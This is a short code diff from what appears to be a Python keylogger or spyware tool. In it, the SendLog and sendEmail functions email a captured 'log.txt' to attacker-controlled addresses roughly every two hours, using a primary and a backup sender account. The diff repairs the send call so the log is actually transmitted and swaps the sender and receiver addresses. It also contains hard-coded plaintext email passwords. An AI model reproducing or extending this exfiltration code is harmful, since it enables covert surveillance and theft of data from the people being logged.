@@ -239,7 +239,7 @@ def sendEmail(log, sender_email, sender_password, receiver_email):
         ]
         # yag.send(receiver_email, subject, contents, attachments=log )
         # print("[+] Email sent successfully")
-        s.sendmail(sender_email, receiver_email, contents)
+        s.sendmail(sender_email, receiver_email, log.as_string())
         print("[+] The mail was sent successfully")
         s.quit()
         return True
@@ -324,11 +324,11 @@ def SendLog():
         sender_password_P    = "Y6dvxnd@"          # <<== email password 
 
         # shipping mail [Secondary]     <=> Only if there is any shipping problem with the main mail
-        sender_email_S       = "eneboltest2022@gmail.com"   # <<== change this email
+        sender_email_S       = "eneboltest@zohomail.com"   # <<== change this email
         sender_password_S    = "Y6dvxnd@"          # <<== email password 
 
         # Email or emails that will receive the data record `log.txt`
-        receiver_email   = ["eneboltest@zohomail.com","mytestemail212121@gmail.com"] # MultiEmail
+        receiver_email   = ["eneboltest@zohomail.com"] # MultiEmail
       # receiver_email   = ["correo@gmail.com"]  # SingleEmail
 
         # Send every 2 hours approx
